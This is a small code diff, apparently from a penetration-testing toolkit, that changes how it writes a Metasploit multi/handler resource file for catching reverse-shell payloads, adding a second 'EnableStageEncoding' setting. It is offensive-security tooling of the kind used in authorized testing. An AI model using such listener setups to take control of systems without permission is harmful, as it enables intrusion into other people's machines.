@@ -423,7 +423,7 @@ try:
                                     # grab ipaddr if not defined
                                     ipaddr = check_options("IPADDR=")
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, ipaddr, shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding true\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, ipaddr, shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
